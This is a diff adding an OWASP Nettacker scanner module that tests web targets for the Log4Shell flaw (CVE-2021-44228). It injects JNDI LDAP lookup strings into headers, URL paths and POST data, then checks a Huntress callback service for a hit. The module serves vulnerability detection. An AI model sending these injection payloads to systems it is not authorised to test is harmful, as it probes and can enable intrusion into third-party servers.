@@ -1,0 +1,131 @@
+info:
+  name: log4j_cve_2021_44228_vuln
+  author: OWASP Nettacker Team
+  severity: 9.8
+  description: Log4J Remote Code Execution
+  reference:
+    - https://log4shell.huntress.com/
+    - https://github.com/huntresslabs/log4shell-tester
+  profiles:
+    - vuln
+    - vulnerability
+    - http
+    - critical_severity
+    - cve2021
+    - cve
+    - log4j
+    - rce
+    - p
+
+payloads:
+  - library: http
+    steps:
+      - method: get
+        verify: false
+        timeout: 3
+        cert: ""
+        stream: false
+        proxies: ""
+        headers:
+          User-Agent: "{user_agent}"
+        url: "https://log4shell.huntress.com/"
+        response:
+          save_to_temp_events_only: "log4shell_token"
+          condition_type: and
+          conditions:
+            content:
+              regex: <code>(.*)<\/code>
+              reverse: false
+
+      - method: get
+        verify: false
+        timeout: 3
+        cert: ""
+        stream: false
+        proxies: ""
+        headers:
+          User-Agent: "{user_agent} - ${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event['content'][0]}}"
+          Cookies: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event['content'][0]}}"
+        url:
+          nettacker_fuzzer:
+            input_format: "{{schema}}://{target}:{{ports}}/{{path}}"
+            prefix: ""
+            suffix: ""
+            interceptors:
+            data:
+              path:
+                - "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event['content'][0]}}"
+              schema:
+                - "http"
+                - "https"
+              ports:
+                - 80
+                - 443
+        response:
+          save_to_temp_events_only: log4shell_junk1
+          dependent_on_temp_event: log4shell_token
+          condition_type: and
+          conditions:
+            content:
+              regex: ''
+              reverse: false
+
+      - method: post
+        verify: false
+        timeout: 3
+        cert: ""
+        stream: false
+        proxies: ""
+        headers:
+          User-Agent: "{user_agent} - ${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event['content'][0]}}"
+          Cookies: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event['content'][0]}}"
+        url:
+          nettacker_fuzzer:
+            input_format: "{{schema}}://{target}:{{ports}}/{{path}}"
+            prefix: ""
+            suffix: ""
+            interceptors:
+            data:
+              path:
+                - "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event['content'][0]}}"
+              schema:
+                - "http"
+                - "https"
+              ports:
+                - 80
+                - 443
+        data:
+          junk: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event['content'][0]}}"
+        response:
+          save_to_temp_events_only: log4shell_junk2
+          dependent_on_temp_event: log4shell_token
+          condition_type: and
+          conditions:
+            content:
+              regex: ''
+              reverse: false
+
+      - method: get
+        verify: false
+        timeout: 3
+        cert: ""
+        stream: false
+        proxies: ""
+        headers:
+          User-Agent: "{user_agent}"
+        url:
+          nettacker_fuzzer:
+            input_format: "https://log4shell.huntress.com/view/{{token}}"
+            prefix: ""
+            suffix: ""
+            interceptors:
+            data:
+              token:
+                - "dependent_on_temp_event['content'][0]"
+        response:
+          dependent_on_temp_event: log4shell_token
+          condition_type: and
+          conditions:
+            content:
+              regex: \b\d{{1,3}}\.\d{{1,3}}\.\d{{1,3}}\.\d{{1,3}}\b
+              reverse: false
